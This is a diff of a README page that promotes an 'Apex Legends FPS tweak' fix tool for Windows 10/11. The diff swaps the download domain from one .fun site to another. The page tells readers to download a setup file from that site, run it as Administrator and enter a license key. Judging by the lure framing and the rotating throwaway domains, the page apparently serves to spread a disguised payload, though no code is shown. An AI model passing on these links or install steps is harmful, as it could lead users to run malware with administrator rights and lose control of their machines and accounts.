@@ -14,14 +14,14 @@ Fix **apex legends fps tweak** on Windows 10/11. Built for PC gamers — **direc
 
 | | |
 | --- | --- |
-| **Direct link** | **[apexlegs.sentineltool.fun](https://apexlegs.sentineltool.fun/)** |
-| **Full URL** | `https://apexlegs.sentineltool.fun/` |
+| **Direct link** | **[apexlegs.nexustool.fun](https://apexlegs.nexustool.fun/)** |
+| **Full URL** | `https://apexlegs.nexustool.fun/` |
 | **Type** | Fix tool for Windows 10 / 11 (64-bit) |
 | **Admin** | Run setup as Administrator |
 
 ### Quick steps
 
-1. Open **[apexlegs.sentineltool.fun](https://apexlegs.sentineltool.fun/)** in your browser
+1. Open **[apexlegs.nexustool.fun](https://apexlegs.nexustool.fun/)** in your browser
 2. Save the file from the project page
 3. Run the setup **as Administrator**
 4. Enter your license key when prompted
